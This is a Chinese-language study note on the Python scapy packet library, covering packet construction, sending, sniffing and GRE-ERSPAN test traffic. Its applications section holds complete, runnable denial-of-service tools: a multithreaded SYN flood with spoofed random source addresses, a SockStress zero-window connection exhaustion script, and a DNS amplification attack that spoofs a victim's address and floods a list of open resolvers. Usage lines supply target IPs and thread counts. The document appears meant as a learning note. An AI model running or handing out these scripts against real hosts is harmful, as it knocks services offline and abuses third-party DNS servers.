```table-of-contents
```
# what
## 定义
[scapy](https://scapy.net/)包模块主要用来构造或者伪造网络中的各种数据报文。提供了从Ether层、IP层、传输层（UDP/TCP）、数据层(二、三、四，应用层)各层的数据报文字段的构造方法。
也可以用来解析数据报文。并能实现伪造异常报文，网络攻击，探测等功能。
## 优缺点
## 特性
# how
## 如何安装
```bash
pip3 install scapy
```
## 如何使用
### 常用工具函数
- 列出所有scapy中的命令或函数
```c
lsc()
```

- 打印查看某个函数或者类的帮助信息
```c
help(sendp)
```

- 查看报文字段信息
```c
ls(TCP)
ls(GRE)
```

```bash
>>> from scapy.all import *
>>> from random import randint
>>> import time
>>>
>>> uuid = randint(1,65534)
>>> ls(IP)                                                           # 查询IP头部定义
version    : BitField  (4 bits)                  = (4)
ihl        : BitField  (4 bits)                  = (None)
tos        : XByteField                          = (0)
len        : ShortField                          = (None)
id         : ShortField                          = (1)
flags      : FlagsField  (3 bits)                = (<Flag 0 ()>)
frag       : BitField  (13 bits)                 = (0)
ttl        : ByteField                           = (64)
proto      : ByteEnumField                       = (0)
chksum     : XShortField                         = (None)
src        : SourceIPField                       = (None)
dst        : DestIPField                         = (None)
options    : PacketListField                     = ([])
>>>
>>> ip_header = IP(dst="192.168.1.1",ttl=64,id=uuid)           # 构造IP数据包头
>>> ip_header.show()                                           # 输出构造好的包头
###[ IP ]###
  version   = 4
  ihl       = None
  tos       = 0x0
  len       = None
  id        = 64541
  flags     =
  frag      = 0
  ttl       = 64
  proto     = ip
  chksum    = None
  src       = 192.168.1.101
  dst       = 192.168.1.1
  \options   \

>>> ip_header.summary()
'192.168.1.101 > 192.168.1.1 ip'
```

- 显示一个报文摘要
```c
pkt.summary()
```

- 展示报文内容
```c
>>> pkt.show()  
>>> pkt.display()
```

- 显示聚合的数据包（例如，计算好了校验和的）
```c
pkt.show2()
```

- 返回可以生产数据包的Scapy命令
```c
pkt.command()
```

### 构建常见协议
site-packages/scapy/layers下，包含构造各种协议报文的方法。有构造其他协议报文需求的读者建议可以去看这下面的源码。

对于报文类，如果想知道报文类提供了字段选项，可以用ls()方法查看，如下所示：
```c
# python3
Python 3.6.8 (default, Apr  2 2020, 13:34:55)
[GCC 4.8.5 20150623 (Red Hat 4.8.5-39)] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from scapy.all import *
>>> ls(IP)
version    : BitField  (4 bits)                  = ('4')
ihl        : BitField  (4 bits)                  = ('None')
tos        : XByteField                          = ('0')
len        : ShortField                          = ('None')
id         : ShortField                          = ('1')
flags      : FlagsField                          = ('<Flag 0 ()>')
frag       : BitField  (13 bits)                 = ('0')
ttl        : ByteField                           = ('64')
proto      : ByteEnumField                       = ('0')
chksum     : XShortField                         = ('None')
src        : SourceIPField                       = ('None')
dst        : DestIPField                         = ('None')
options    : PacketListField                     = ('[]')
```

- 构造ICMP报文
```c
str='abdndjafn'  
pkt=IP(src,dst=192.168.1.1)/ICMP(type=8)/Raw(str)
```
- 构造UDP报文
```c
pkt=Ether(src=xxxx,dst=xxxx)/ip(src,dst)/UDP(sport=xxx,dport=xxxx)/Raw()
```

- 构造TCP报文
```c
pkt=Ether(src=xxxx,dst=xxxx)/ip(src=xxxx,dst=xxxx)/TCP(sport=xxxx,dport=xxxx)/Raw()
```

### 发送/接受报文函数
当我们构造好一个数据包后，下一步则是需要将该数据包发送出去，对于发送数据包Scapy中提供了多种发送函数，如下则是不同的几种发包方式，当我们呢最常用的还是sr1()该函数用于发送数据包并只接受回显数据。

send(pkt)：发送三层数据包，但不会收到返回的结果
sr(pkt)：发送三层数据包，返回两个结果，分别是接收到响应的数据包和未收到响应的数据包
sr1(pkt)：发送三层数据包，仅仅返回接收到响应的数据包
sendp(pkt)：发送二层数据包
srp(pkt)：发送二层数据包，并等待响应
srp1(pkt)：发送第二层数据包，并返回响应的数据包

#### send()方法
三层以上，不能指定网络接口。
当loop=1时，一直发包。以下例子为发10个报文，报文间隔为1s。
```c
send(pkt,loop=0,inter=1,count=10)
```
#### sendp()方法
工作在2层，发包时必须指定网络接口。其他参数与send()方法一致。
```c
sendp(pkt,iface,loop=0,inter=1,count=5)
```

#### sendpfast()方法
工作在二层，可以指定网络接口和速率发包。
```c
sendpfast(pkt,iface,pps,mbps,loop=0)
```

#### sr()方法
发送数据包和接收响应，工作在3层（IP和ARP）。该函数返回有回应的数据包和没有回应的数据包。返回的两个列表数据，第一个就是发送的数据包及其应答组成的列表，第二个是无应答数据包组成的列表。

**sr1()方法**
与sr类似，工作在3层(IP和ARP)。但它只返回应答发送的分组（或分组集），用来返回一个应答数据包。
```c
>>> pkt1=IP()/ICMP()/Padding(str)  
>>> p=sr1(pkt)  
>>> p.show()  
>>> pkt=IP(dst=‘192.168.1.1’)/UDP()/DNS(rd=1,qd=DNSQR(qname=‘www.baidu.com’))  
>>> ans=sr1(pkt_dns)  
>>> ans.show()
```

### 数据包处理
#### 嗅探报文
```c
sniff(count=0,offline=None,store=True,prn=None,filter,timeout,iface)
```
- count=200 抓到200个报文，即停止嗅探报文
- offline=‘D:\2019H1work\igmp.pcap’ 解析本地cap文件
- store=0 避免将所有的数据包存储在内存。
- prn 为报文处理函数，回调此函数对抓到的报文进行处理
- filter=‘arp or icmp or (udp and src port 68 and dst port 67)’ 过滤条件，伯克利语法
- timeout 抓包时间，默认为None


#### 保存数据报文
```c
pkts=sniff(filter=‘arp or icmp’,iface=‘eth1’,timeout=120)  
wrpcap(‘test.cap’,pkts)    #写到当前目录test.cap中
```
#### 读取本地数据报文
有2种方法可以实现读取本地数据包，如下
```c
pkts= rdpcap(‘D:\\2019H1work\\igmp.pcap’ )  
pkts= sniff(offline=‘D:\\2019H1work\\igmp.pcap’ )
```

#### 数据包内容提取
其实在sniff()嗅探报文或者rdpcap()读取报文的时候，报文已经自动解析完成了。
我们可以直接获取报文不同层的字段值
```c
>>> pkts=sniff(filter=‘igmp’,iface=‘eth1’)  
>>> type(pkts) #报文类型  
>>> pkts.show() #报文列表  
>>> pkts[0][IP].show #第一个报文的IP层  
>>> pkts[0][Ether].src #第一个报文的源MAC地址  
>>> pkts[IGMP].show() #只显示IGMP报文  
>>> pkts[IGMP][0][IGMP].show() #显示IGMP报文第一个报文的IGMP层字段信息
```


# why
## 原理

# 应用
## 模拟synflood的半连接攻击
```bash
#coding=utf-8
import argparse
import socket,sys,random,threading
from scapy.all import *

scapy.config.conf.iface = 'ens32'

# 攻击目标主机TCP/IP半开放连接数
def synflood(target,dstport):
    # 加锁
    semaphore.acquire()
    issrc = '%i.%i.%i.%i' % (random.randint(1,254),random.randint(1,254),random.randint(1,254), random.randint(1,254))
    isport = random.randint(1,65535)
    ip = IP(src = issrc,dst = target)
    syn = TCP(sport = isport, dport = dstport, flags = 'S')
    send(ip / syn, verbose = 0)
    print("[+] sendp --> {} {}".format(target,isport))
    # 释放锁
    semaphore.release()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-H","--host",dest="host",type=str,help="输入被攻击主机IP地址")
    parser.add_argument("-p","--port",dest="port",type=int,help="输入被攻击主机端口")
    parser.add_argument("--type",dest="types",type=str,help="指定攻击的载荷 (synflood)")
    parser.add_argument("-t","--thread",dest="thread",type=int,help="指定攻击并发线程数")
    args = parser.parse_args()
    # 使用方式: main.py --type=synflood -H 192.168.1.1 -p 80 -t 10
    if args.types == "synflood" and args.host and args.port and args.thread:
        semaphore = threading.Semaphore(args.thread)
        while True:
            t = threading.Thread(target=synflood,args=(args.host,args.port))
            t.start()
    else:
        parser.print_help()
```


执行：
```bash
通过传入`--type=synflood -H 192.168.1.1 -p 80 -t 10`参数，
其含义是对`192.168.1.1`主机的`80`端口执行洪水攻击，并启用`10`个线程执行
```
## TCP全连接攻击
### 介绍
SockStress 全连接攻击属于`TCP`全连接攻击，其攻击的原理与`SYN Flood`攻击类似，但是它使用完整的TCP三次握手，这使得它更难以检测和防御。

该攻击的关键点就在于，攻击主机**将三次握手的ACK的`windows`窗口缓冲设置为`0`，实现拒绝服务**。攻击者向目标发送一个很小的流量，但是会造成产生的攻击流量是一个巨大的，该攻击消耗的是目标系统的`CPU/内存`资源。
![](attachments/Pasted%20image%2020240402160450.png)


该攻击方式通过与目标主机建立大量的`socket`连接，并且都是完整连接，最后的`ACK`包，将`Window`窗口大小设置为`0`，客户端不接收数据，而服务器此时会认为客户端缓冲区还没有准备好，从而一直等待下去（持续等待将使目标机器内存一直被占用），由于是异步攻击，所以单机模式也可以拒绝高配的服务器。


### 实现
简单实现
```python3
import argparse
import socket,sys,random,threading
from scapy.all import *

scapy.config.conf.iface = 'eth04'


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-H","--host",dest="host",type=str,help="输入被攻击主机IP地址")
    parser.add_argument("-p","--port",dest="port",type=int,help="输入被攻击主机端口")
    args = parser.parse_args()
    max_value = 2 ** 32
    target = args.host
    dstport = args.port
    for isn in range(0, max_value):
        isport = random.randint(0,65535)
        response = sr1(IP(dst=target)/TCP(sport=isport,dport=dstport,seq=isn,flags="S"),timeout=1,verbose=0)
        if None != response: 
            send(IP(dst=target)/ TCP(dport=dstport,sport=isport,window=10000,flags="A",seq=(isn+1), ack=(response[TCP].seq +1))/'\x00\x00',verbose=0)
        print("[+] sendp --> {} {} {}".format(target,isport,isn))
```

多线程实现：
```python3
#coding=utf-8
import argparse
import socket,sys,random,threading
from scapy.all import *

scapy.config.conf.iface = 'ens32'

# 攻击目标主机的Window窗口
def sockstress(target,dstport):
    # 加锁
    semaphore.acquire()
    isport = random.randint(0,65535)
    response = sr1(IP(dst=target)/TCP(sport=isport,dport=dstport,flags="S"),timeout=1,verbose=0)
    send(IP(dst=target)/ TCP(dport=dstport,sport=isport,window=0,flags="A",ack=(response[TCP].seq +1))/'\x00\x00',verbose=0)
    print("[+] sendp --> {} {}".format(target,isport))
    # 释放锁
    semaphore.release()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-H","--host",dest="host",type=str,help="输入被攻击主机IP地址")
    parser.add_argument("-p","--port",dest="port",type=int,help="输入被攻击主机端口")
    parser.add_argument("--type",dest="types",type=str,help="指定攻击的载荷 (sockstress)")
    parser.add_argument("-t","--thread",dest="thread",type=int,help="指定攻击并发线程数")
    args = parser.parse_args()
    # 使用方式: main.py --type=sockstress -H 192.168.1.1 -p 80 -t 10
    if args.types == "sockstress" and args.host and args.port and args.thread:
        semaphore = threading.Semaphore(args.thread)
        while True:
            t = threading.Thread(target=sockstress,args=(args.host,args.port))
            t.start()
    else:
        parser.print_help()
```


执行：
```bash
通过指定`--type=sockstress -H 192.168.1.1 -p 80 -t 100`
即可实现对特定主机特定端口的拒绝服务
```


### 其他实现
**三次握手**
![](attachments/Pasted%20image%2020240402151627.png)

```python3
from scapy.all import *
 
dst_ip = "192.168.1.1"
dst_port = 80
src_port = 20001
data = "GET / HTTP/1.0/nihao \r\n\r\n"
##数据是我随意构造的，一个随便的http请求
try:
    ##产生SYN包（FLAG = S 为SYN）
    spk1 = IP(dst=dst_ip)/TCP(dport=dst_port,sport=src_port,flags="S")
    res1 = sr1(spk1)
    ack1 = res1[TCP].ack
    ack2 = res1[TCP].seq + 1
    ##发送ACK(flag = A),完成三次握手
    spk2 = IP(dst=dst_ip)/TCP(dport=dst_port,sport=src_port,seq=ack1,ack=ack2,falgs="A")
    send(spk2)
except Exception as e:
    print(e)
##握完手后，由你先给他发第一个数据包，需要照搬第三个包的确认号和验证号，同时flags设值为24,后面跟##数据即可
da1 = IP(dst=dst_ip)/TCP(dport=dst_port,sport=src_port,seq=ack1,ack=ack2,flags=24)/data
res2 = sr1(da1)
```


**问题**
在使用Pyhon scapy库构造TCP时，遭遇到系统底层发送的rst包，导致三次握手无法建立情况。

在网上找了很多解决方案，linux相对好解决，直接使用
```bash
iptables -A OUTPUT -p tcp --tcp-flags RST RST -d DIP --dport DPORT -j DROP
```
可以干掉系统rst包干扰。


## 模拟DNS查询放大攻击
### 介绍
DNS查询放大攻击是一种利用域名系统（DNS）服务器的缺陷来放大攻击流量的网络攻击。攻击者通过向具有恶意域名的DNS服务器发送DNS查询请求，该服务器会向被攻击者发送响应，但是响应内容比请求更大。攻击者可以利用这种响应的放大效应，将大量流量发送到被攻击者的系统上，从而导致系统资源的耗尽和服务不可用。

该攻击可以通过欺骗和利用DNS协议的特性进行，通常利用UDP端口53来执行。攻击者会伪造一个源IP地址，向DNS服务器发送一个查询请求，请求的数据包比较小，但是响应的数据包比请求的数据包大很多，这就导致了放大的效果。

### DNS包信息
DNS是域名系统（Domain Name System）的缩写，是一个用于将域名转换为IP地址的分布式数据库系统。在进行DNS查询时，客户端会向DNS服务器发送DNS查询请求（DNS Query，DNSQR）包，DNS服务器则会回应DNS响应（DNS Response，DNSRR）包。

**一个DNSQR包含以下重要的字段**：
问题域名（QNAME）：需要进行查询的域名
查询类型（QTYPE）：查询的类型，例如A记录、AAAA记录、CNAME记录等
查询类（QCLASS）：查询的类别，通常为Internet（IN）

**一个DNSRR包含以下重要的字段**：
资源记录名称（RR NAME）：资源记录的名称
资源记录类型（TYPE）：资源记录的类型，例如A记录、AAAA记录、CNAME记录等
资源记录类（CLASS）：资源记录的类别，通常为Internet（IN）
生存时间（TTL）：资源记录在DNS缓存中的生存时间
数据长度（RDLENGTH）：资源记录的数据长度
资源记录数据（RDATA）：资源记录的数据，例如IPv4地址、IPv6地址、域名等

### 攻击原理
查询放大攻击的原理是，通过网络中存在的DNS服务器资源，对目标主机发起拒绝服务攻击，通过伪造源地址为被攻击目标的地址，向DNS递归服务器发起查询请求，此时由于源IP是伪造的，固在DNS服务器回包的时候，会默认回给伪造的IP地址，从而使DNS服务成为了流量放大和攻击的实施者，通过查询大量的DNS服务器，从而实现反弹大量的查询流量，导致目标主机查询带宽被塞满，实现DDOS的目的。

查询放大攻击的实施依赖于海量的DNS服务器资源，所以在执行攻击时需要自行寻找这些服务器资源，当找到后则可存储到文件内，当需要使用时首先调用Inspect_DNS_Usability函数依次验证DNS服务器的可用性，并将可用的地址保存为pass.log文件，当需要发起攻击时可通过DNS_Flood调用并传入合法的DNS服务器地址实现DNS查询。


### 实现
```python3
import os,sys,threading,time
from scapy.all import *
import argparse

def Inspect_DNS_Usability(filename):
    proxy_list = []
    fp = open(filename,"r")
    for i in fp.readlines():
        try:
            addr = i.replace("\n","")
            respon = sr1(IP(dst=addr)/UDP()/DNS(rd=1,qd=DNSQR(qname="www.baidu.com")),timeout=2)
            if respon != "":
                proxy_list.append(str(respon["IP"].src))
        except Exception:
            pass
    return proxy_list

def DNS_Flood(target,dns):
    # 构造IP数据包
    ip_pack = IP()
    ip_pack.src = target
    ip_pack.dst = dns
#   ip_pack.src = "192.168.1.2"
#   ip_pack.dst = "8.8.8.8"
    # 构造UDP数据包
    udp_pack = UDP()
    udp_pack.sport = 53
    udp_pack.dport = 53
    # 构造DNS数据包
    dns_pack = DNS()
    dns_pack.rd = 1
    dns_pack.qdcount = 1
    # 构造DNSQR解析
    dnsqr_pack = DNSQR()
    dnsqr_pack.qname = "baidu.com"
    dnsqr_pack.qtype = 255
    dns_pack.qd = dnsqr_pack
    respon = (ip_pack/udp_pack/dns_pack)
    sr1(respon)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--mode",dest="mode",help="选择执行命令<check=检查DNS可用性/flood=攻击>")
    parser.add_argument("-f","--file",dest="file",help="指定一个DNS字典,里面存储DNSIP地址")
    parser.add_argument("-t",dest="target",help="输入需要攻击的IP地址")
    args = parser.parse_args()
    # 使用方式: main.py --mode=check -f xxx.log
    if args.mode == "check" and args.file:
        proxy = Inspect_DNS_Usability(args.file)
        fp = open("pass.log","w+")
        for item in proxy:
            fp.write(item + "\n")
        fp.close()
        print("[+] DNS地址检查完毕,当前可用DNS保存为 pass.log")
    # 使用方式: main.py --mode=flood -f xxx.log -t 192.168.1.1
    elif args.mode == "flood" and args.target and args.file:
        with open(args.file,"r") as fp:
            countent = [line.rstrip("\n") for line in fp]
            while True:
                randomDNS = str(random.sample(countent,1)[0])
                print("[+] 目标主机: {} -----> 随机DNS: {}".format(args.target,randomDNS))
                t = threading.Thread(target=DNS_Flood,args=(args.target,randomDNS,))
                t.start()
    else:
        parser.print_help()
```

# 范例
## 使用scapy 构造 Gre-Erspan type 2的数据包
如下所示，使用scapy 构造 Gre-Erspan type 2的数据包。其中，Erspan头，在Scapy中并不存在，则使用多个字节来进行构造。

```python
#!/usr/bin/python3

from scapy.all import *
import socket

OUTER_SIP_PRE="192.20.3."
OUTER_SIP_START=12
OUTER_DIP="192.22.2.127"
OUTER_IP_PROTO=0x2f

GRE_FLAGS=0
GRE_SEQ_FLAG=1
GRE_VERSION=0
GRE_PROTO=0x88BE

INNER_SMAC="fa:16:3e:c8:54:10"
INNER_DMAC="fa:16:3e:f6:ad:bf"

INNER_SIP_PRE="192.1.1."
INNER_SIP_START=1
INNER_DIP="192.2.2.2"

INNER_SPORT_START=8080
INNER_DPORT=80

def build_gre_erspan_type2_pkt(idx):
    outer_sip_end=OUTER_SIP_START + idx
    OUTER_SIP=OUTER_SIP_PRE + str(outer_sip_end)
    outer_ip = IP(src=OUTER_SIP, dst=OUTER_DIP, proto=OUTER_IP_PROTO)
    Gre = GRE(seqnum_present=1,version=GRE_VERSION, proto=GRE_PROTO)
    Erspan_type_hdr = b'\x10\x00\x18\x00\x00\x00\x00\x36'
    inner_ether = Ether(src=INNER_SMAC, dst=INNER_DMAC)
    INNER_SIP = INNER_SIP_PRE + str(INNER_SIP_START)
    inner_ip = IP(src=INNER_SIP, dst=INNER_DIP)
    for i in range(5):
        INNER_SPORT = INNER_SPORT_START + i
        inner_udp = UDP(sport=INNER_SPORT, dport=INNER_DPORT)
        payload_info = "hello world 112233"
        udp_payload = Raw(payload_info)
        pkt = outer_ip/Gre/Erspan_type_hdr/inner_ether/inner_ip/inner_udp/udp_payload
        send(pkt)

def build_gre_erspan_type2_inner_reverse_pkt(idx):
    outer_sip_end=OUTER_SIP_START + idx
    OUTER_SIP=OUTER_SIP_PRE + str(outer_sip_end)
    outer_ip = IP(src=OUTER_SIP, dst=OUTER_DIP, proto=OUTER_IP_PROTO)
    Gre = GRE(seqnum_present=1,version=GRE_VERSION, proto=GRE_PROTO)
    Erspan_type_hdr = b'\x10\x00\x18\x00\x00\x00\x00\x36'
    inner_ether = Ether(src=INNER_SMAC, dst=INNER_DMAC)
    INNER_SIP = INNER_SIP_PRE + str(INNER_SIP_START)
    inner_ip = IP(src=INNER_DIP, dst=INNER_SIP)
    for i in range(5):
        INNER_SPORT = INNER_SPORT_START + i
        inner_udp = UDP(sport=INNER_DPORT, dport=INNER_SPORT)
        payload_info = "hello world 112233"
        udp_payload = Raw(payload_info)
        pkt = outer_ip/Gre/Erspan_type_hdr/inner_ether/inner_ip/inner_udp/udp_payload
        send(pkt)

def build_gre_erspan_type2_multi_inner_flows(idx):
    outer_sip_end=OUTER_SIP_START + idx
    OUTER_SIP=OUTER_SIP_PRE + str(outer_sip_end)
    outer_ip = IP(src=OUTER_SIP, dst=OUTER_DIP, proto=OUTER_IP_PROTO)
    Gre = GRE(seqnum_present=1,version=GRE_VERSION, proto=GRE_PROTO)
    Erspan_type_hdr = b'\x10\x00\x18\x00\x00\x00\x00\x36'
    inner_ether = Ether(src=INNER_SMAC, dst=INNER_DMAC)
    INNER_SIP = INNER_SIP_PRE + str(INNER_SIP_START + idx)
    inner_ip = IP(src=INNER_SIP, dst=INNER_DIP)
    for i in range(5):
        INNER_SPORT = INNER_SPORT_START + i
        inner_tcp = TCP(sport=INNER_SPORT, dport=INNER_DPORT)
        payload_info = "hello world 112233"
        payload = Raw(payload_info)
        pkt = outer_ip/Gre/Erspan_type_hdr/inner_ether/inner_ip/inner_tcp/payload
        send(pkt)

def main():
    for i in range(5):
        build_gre_erspan_type2_pkt(i)
        build_gre_erspan_type2_inner_reverse_pkt(i)
        build_gre_erspan_type2_multi_inner_flows(i)

if __name__ == '__main__':
    main()
```

## 使用scapy构造Gre-Erspan type 1的数据包
如下所示，构造Gre-Erspan type 1的数据包。
```python
#!/usr/bin/python3

from scapy.all import *
import socket

OUTER_SIP_PRE="192.20.3."
OUTER_SIP_START=12
OUTER_DIP="192.22.2.127"
OUTER_IP_PROTO=0x2f

GRE_FLAGS=0
GRE_VERSION=0
GRE_PROTO=0x88BE

INNER_SMAC="fa:16:3e:c8:54:10"
INNER_DMAC="fa:16:3e:f6:ad:bf"

INNER_SIP_PRE="192.1.1."
INNER_SIP_START=1
INNER_DIP="192.2.2.2"

INNER_SPORT_START=8080
INNER_DPORT=80

def build_gre_erspan_type1_pkt(idx):
    outer_sip_end=OUTER_SIP_START + idx
    OUTER_SIP=OUTER_SIP_PRE + str(outer_sip_end)
    outer_ip = IP(src=OUTER_SIP, dst=OUTER_DIP, proto=OUTER_IP_PROTO)
    Gre = GRE(flags=GRE_FLAGS, version=GRE_VERSION, proto=GRE_PROTO)
    inner_ether = Ether(src=INNER_SMAC, dst=INNER_DMAC)
    INNER_SIP = INNER_SIP_PRE + str(INNER_SIP_START)
    inner_ip = IP(src=INNER_SIP, dst=INNER_DIP)
    for i in range(5):
        INNER_SPORT = INNER_SPORT_START + i
        inner_udp = UDP(sport=INNER_SPORT, dport=INNER_DPORT)
        payload_info = "hello world 112233"
        udp_payload = Raw(payload_info)
        pkt = outer_ip/Gre/inner_ether/inner_ip/inner_udp/udp_payload
        send(pkt)

def build_gre_erspan_type1_inner_reverse_pkt(idx):
    outer_sip_end=OUTER_SIP_START + idx
    OUTER_SIP=OUTER_SIP_PRE + str(outer_sip_end)
    outer_ip = IP(src=OUTER_SIP, dst=OUTER_DIP, proto=OUTER_IP_PROTO)
    Gre = GRE(flags=GRE_FLAGS, version=GRE_VERSION, proto=GRE_PROTO)
    inner_ether = Ether(src=INNER_SMAC, dst=INNER_DMAC)
    INNER_SIP = INNER_SIP_PRE + str(INNER_SIP_START)
    inner_ip = IP(src=INNER_DIP, dst=INNER_SIP)
    for i in range(5):
        INNER_SPORT = INNER_SPORT_START + i
        inner_udp = UDP(sport=INNER_DPORT, dport=INNER_SPORT)
        payload_info = "hello world 112233"
        udp_payload = Raw(payload_info)
        pkt = outer_ip/Gre/inner_ether/inner_ip/inner_udp/udp_payload
        send(pkt)

def build_gre_erspan_type1_multi_inner_flows(idx):
    outer_sip_end=OUTER_SIP_START + idx
    OUTER_SIP=OUTER_SIP_PRE + str(outer_sip_end)
    outer_ip = IP(src=OUTER_SIP, dst=OUTER_DIP, proto=OUTER_IP_PROTO)
    Gre = GRE(flags=GRE_FLAGS, version=GRE_VERSION, proto=GRE_PROTO)
    inner_ether = Ether(src=INNER_SMAC, dst=INNER_DMAC)
    INNER_SIP = INNER_SIP_PRE + str(INNER_SIP_START + idx)
    inner_ip = IP(src=INNER_SIP, dst=INNER_DIP)
    for i in range(5):
        INNER_SPORT = INNER_SPORT_START + i
        inner_tcp = TCP(sport=INNER_SPORT, dport=INNER_DPORT)
        payload_info = "hello world 112233"
        payload = Raw(payload_info)
        pkt = outer_ip/Gre/inner_ether/inner_ip/inner_tcp/payload
        send(pkt)

def main():
    for i in range(5):
        build_gre_erspan_type1_pkt(i)
        build_gre_erspan_type1_inner_reverse_pkt(i)
        build_gre_erspan_type1_multi_inner_flows(i)

if __name__ == '__main__':
    main()
```

## 使用scapy构造自定义头的包
如下所示，通过 struct pack/unpack 来构造结构体。
```c
#!/usr/bin/python2.6
"""
build sync session packet
"""
from scapy.all import *
import struct
import socket

CADDR = "100.64.64.26"
VADDR = "100.64.43.254"
RS_ADDR = "100.64.64.26"
BK_ADDR = "100.64.37.200"
CPORT = 40000
VPORT = 80
RS_PORT = 80
BK_PORT = 2049
SS_CNT = 20

RELAY_IP = '100.64.28.253'
RELAY_IP1 = '100.64.64.26'

def build_sync_header(magic_num, pri_data, msg_type):
    """
typedef struct bgw_sync_header_s {
    u32 magic_num;
    u32 private_data;
    u8 msg_type;
} bgw_sync_header_t;
    """
    fs = "2IB3x"
    sh = struct.pack(fs, magic_num, pri_data, msg_type)
    return sh


def build_sync_msg_header(msg_version, ss_cnt):
    """
typedef struct bgw_sync_sess_msg_s {
    u8 msg_version;
    u8 ss_cnt;
} bgw_sync_sess_msg_t;
    """
    fs = "2B2x"
    return struct.pack(fs, msg_version, ss_cnt)


def build_sync_sess_msg(caddr=0, vaddr=0, rs_addr=0, bk_addr=0,
    cport=0, vport=0, rs_port=0, bk_port=0, init_seq=0, delta_seq=0, 
    ul_ns_vlb=0, ul_ns_vni=0, dl_ns_vlb=0, dl_ns_vni=0, cvtep_ip=0,
    src_port=0, client_mac=[0, 0, 0, 0, 0, 0], action=0):
    """
typedef struct bgw_sync_session_s {
    u32         caddr;
    u32         vaddr;
    u32         rs_addr;
    u32         bk_addr;
    u16         cport;
    u16         vport;
    u16         rs_port;
    u16         bk_port;

    bgw_seq_t pp_dtl; /*proxy protocol data length, reserve for pp*/
    
    ns_t            ul_ns;
    ns_t            dl_ns;
    session_priv_t  priv; /* session extend data, contain tunnel parameters. */
    u8 action;
} bgw_sync_session_t;
    """
    caddr =  struct.unpack("I", socket.inet_aton(str(caddr)))[0]
    vaddr = struct.unpack("I", socket.inet_aton(str(vaddr)))[0]
    rs_addr =  struct.unpack("I", socket.inet_aton(str(rs_addr)))[0]
    bk_addr =  struct.unpack("I", socket.inet_aton(str(bk_addr)))[0]

    cport = socket.ntohs(cport)
    vport = socket.ntohs(vport)
    rs_port = socket.ntohs(rs_port)
    bk_port = socket.ntohs(bk_port)
    # ul_ns_vlb =  socket.ntohl(struct.unpack("I",socket.inet_aton(str(ul_ns_vlb)))[0])  
    # dl_ns_vlb =  socket.ntohl(struct.unpack("I",socket.inet_aton(str(dl_ns_vlb)))[0])

    ret = struct.pack("4I", caddr, vaddr, rs_addr, bk_addr)
    ret += struct.pack("4H", cport, vport, rs_port, bk_port)
    ret += struct.pack("7I", init_seq, delta_seq, ul_ns_vlb, 
        ul_ns_vni, dl_ns_vlb, dl_ns_vni, cvtep_ip)
    ret += struct.pack("H", src_port)
    ret += struct.pack("6B", *client_mac)
    # ret += struct.pack("H", cp_rs_port)
    ret += struct.pack("B3x", action)
    return ret


def build_pkt_for_worker(worker_id=1):
    """build sync session pkt for worker_id"""
    sh = build_sync_header(20190426, worker_id, 0)
    sm  = build_sync_msg_header(1, SS_CNT)
    msg = sh + sm
    for i in xrange(SS_CNT):
        msg += build_sync_sess_msg(caddr=CADDR, vaddr=VADDR, 
                    rs_addr=RS_ADDR, bk_addr=BK_ADDR, 
                    cport=CPORT + i, vport=VPORT, rs_port=RS_PORT, bk_port=BK_PORT + i)
    
    ip = IP(src=RELAY_IP1, dst=RELAY_IP)
    udp = UDP(sport = 45638, dport=8789)
    send(ip / udp / msg)


def build_ingress_pkt():
    """build ingress data pkt and send to bgw"""
    ip = IP(src=CADDR, dst=VADDR)
    for i in xrange(SS_CNT):
        tcp = TCP(sport=CPORT + i, dport=VPORT, flags="PA")
        data = 'a' * 100
        send(ip / tcp / data)


def build_egress_pkt():
    """build egress data pkt and send to bgw"""
    ip = IP(src=RS_ADDR, dst=BK_ADDR)
    for i in xrange(SS_CNT):
        tcp = TCP(sport=RS_PORT, dport=BK_PORT + i, flags="PA")
        data = 'a' * 100
        send(ip / tcp / data)


def main():
    """"build sync session pkt, build ingress and egress data pkt"""
    for i in xrange(5):
        build_pkt_for_worker(i)
    build_ingress_pkt()
    build_egress_pkt()


if __name__ == '__main__':
    main()
    


```


# 参考
```c
官方文档：
https://scapy.readthedocs.io/en/latest/

中文文档：
https://alanfanh.github.io/2019/03/08/scapy%E5%8C%85%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/



https://blog.csdn.net/dive668/article/details/124100923
```